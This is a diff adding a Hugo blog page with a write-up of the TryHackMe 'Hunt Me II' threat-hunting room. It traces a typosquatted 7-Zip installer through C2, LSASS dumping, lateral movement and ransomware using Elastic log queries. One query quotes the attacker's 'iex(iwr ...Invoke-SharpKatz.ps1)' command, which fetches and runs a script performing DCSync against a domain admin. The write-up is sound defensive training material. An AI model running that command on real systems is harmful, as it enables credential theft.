@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  TryHackMe Hunt Me II: Typo Squatters write-up · Degen
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="degenware">
+<meta name="description" content="Scenario:
+Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.">
+<meta name="keywords" content="blog,cybersecurity,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Hunt Me II: Typo Squatters write-up">
+  <meta name="twitter:description" content="Scenario:
+Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.">
+
+<meta property="og:url" content="http://localhost:1313/posts/huntme2/">
+  <meta property="og:site_name" content="Degen">
+  <meta property="og:title" content="TryHackMe Hunt Me II: Typo Squatters write-up">
+  <meta property="og:description" content="Scenario:
+Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-11-14T07:07:07+01:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/huntme2/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Degen
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Posts</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/huntme2/">
+              TryHackMe Hunt Me II: Typo Squatters write-up
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-11-14T07:07:07&#43;01:00">
+                November 14, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><strong>Scenario:</strong></p>
+<p><em>Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.</em></p>
+<p><img src="images/img1.png" alt="alt"></p>
+<p><em>Last <strong>September 26, 2023</strong>, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.</em></p>
+<p><strong>Questions:</strong></p>
+<ol>
+<li><em>What is the URL of the malicious software that was downloaded by the victim user?</em></li>
+</ol>
+<p>We know from the description that the victim used google chrome to download the file. We also know that downloading a file creates an event with sysmon ID 11 (File Creation).</p>
+<p><code>process.name:chrome.exe AND winlog.event_id:11</code></p>
+<p><img src="images/img2.png" alt="alt"></p>
+<p>We find that 7z2301-x64.msi was downloaded. Let&rsquo;s query for it to find the URL</p>
+<p><code>process.name:chrome.exe AND 7z2301-x64.msi</code></p>
+<p><img src="images/img3.png" alt="alt"></p>
+<ol start="2">
+<li><em>What is the IP address of the domain hosting the malware?</em></li>
+</ol>
+<p>We can simply query for DNS events that contain the attacker&rsquo;s domain</p>
+<p><code>7zipp.org AND network.protocol: DNS</code></p>
+<p><img src="images/img4.png" alt="alt"></p>
+<ol start="3">
+<li><em>What is the PID of the process that executed the malicious software?</em></li>
+</ol>
+<p>We have the name of the file and we also know that executing the software will create a new process - event ID 1</p>
+<p><code>7z2301-x64.msi AND winlog.event_id:1</code></p>
+<p>Checking the chronologically first event</p>
+<p><img src="images/img5.png" alt="alt"></p>
+<ol start="4">
+<li><em>Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?</em></li>
+</ol>
+<p>To follow the execution flow we simply search for processes with PID or PPID of 2532. This way we can see what other things the process did as well as its child processes</p>
+<p><code>process.pid:2532 OR process.parent.pid:2532</code></p>
+<p>We find another suspicious event</p>
+<p><img src="images/img6.png" alt="alt"></p>
+<p>It has different PPID than the process we found before. As this is the only interesting thing we get let&rsquo;s check this out the same way we did</p>
+<p><code>process.pid:4188 OR process.parent.pid:4188</code></p>
+<p>We get a lot of suspicious events, however it all starts with execution of malicious dll</p>
+<p><img src="images/img7.png" alt="alt"></p>
+<p>We don&rsquo;t know how it got on the system so again let&rsquo;s follow this process</p>
+<p><code>process.pid:3988 OR process.parent.pid:3988</code></p>
+<p><img src="images/img8.png" alt="alt"></p>
+<p>There is one more similar event but it was spawned by a different process. Let&rsquo;s look a bit closer at this event</p>
+<p><img src="images/img9.png" alt="alt"></p>
+<p>We find the command that downloaded a powershell script and spawned this event</p>
+<ol start="5">
+<li><em>The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?</em></li>
+</ol>
+<p>We simply search for processes spawned by the script</p>
+<p><code>process.parent.pid:4248</code></p>
+<p><img src="images/img10.png" alt="alt"></p>
+<ol start="6">
+<li><em>What is the name of the service that was installed?</em></li>
+</ol>
+<p>The answer is within the events returned by the previous query</p>
+<p><img src="images/img11.png" alt="alt"></p>
+<ol start="7">
+<li><em>The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?</em></li>
+</ol>
+<p>Still the same query is enough</p>
+<p><img src="images/img12.png" alt="alt"></p>
+<ol start="8">
+<li><em>After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?</em></li>
+</ol>
+<p>Let&rsquo;s go back to analyzing what happens after the attackers executes their malicious dll. The PID of that process is 4188 so we simply query for it&rsquo;s child processes</p>
+<p><code>process.parent.pid:4188</code></p>
+<p><img src="images/img13.png" alt="alt"></p>
+<p>We see the attacker uses Invoke-NanoDump to dump the LSASS data and then parses it with Invoke-PowerExtract</p>
+<ol start="9">
+<li><em>What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)</em></li>
+</ol>
+<p>Same search, few events later we have the answer</p>
+<p><img src="images/img14.png" alt="alt"></p>
+<ol start="10">
+<li><em>After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?</em></li>
+</ol>
+<p>A little bit more events later</p>
+<p><img src="images/img15.png" alt="alt"></p>
+<ol start="11">
+<li><em>What is the name of the workstation where the new account was used?</em></li>
+</ol>
+<p>Even more events later&hellip;Since all these events happened on workstation WKSTN-03 we can see that the attacker pivoted to WKSTN-02 using anna.jones account</p>
+<p><img src="images/img16.png" alt="alt"></p>
+<ol start="12">
+<li><em>After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?</em></li>
+</ol>
+<p>Obviously we have to search for anna.jones and WKSTN-02. We can also add some filters as otherwise we get thousands of events</p>
+<p><code>user.name:anna.jones AND host.hostname:WKSTN-02 AND process.command_line:* AND process.name:*</code></p>
+<p>After searching through events we find an answer</p>
+<p><img src="images/img17.png" alt="alt"></p>
+<ol start="13">
+<li><em>Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?</em></li>
+</ol>
+<p>After searching some more</p>
+<p><img src="images/img18.png" alt="alt"></p>
+<ol start="14">
+<li><em>What is the AES256 hash of the domain admin based on the credential dumping output?</em></li>
+</ol>
+<p><img src="images/img19.png" alt="alt"></p>
+<p>We have the ntlm hash in this event. To find its AES256 hash we need to find an event that contains the output of the attackers command that dumped the hashes</p>
+<p><code>process.command_line:&quot;-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command '--Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall'&quot; AND hash</code></p>
+<p>Looking closer at the event returned we find an answer</p>
+<p><img src="images/img20.png" alt="alt"></p>
+<ol start="15">
+<li><em>After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?</em></li>
+</ol>
+<p>Going back to this search from Q12</p>
+<p><code>user.name:anna.jones AND host.hostname:WKSTN-02 AND process.command_line:* AND process.name:*</code></p>
+<p><img src="images/img21.png" alt="alt"></p>
+<p>We see that last events execute bomb.exe on both workstations. This is more than likely the ransomware. Let&rsquo;s find out how many file has this process created (ID 11)</p>
+<p><code>process.name:bomb.exe AND winlog.event_id:11</code></p>
+<p><img src="images/img22.png" alt="alt"></p>
+<p>We get 46 events returned</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2024
+     degenware 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
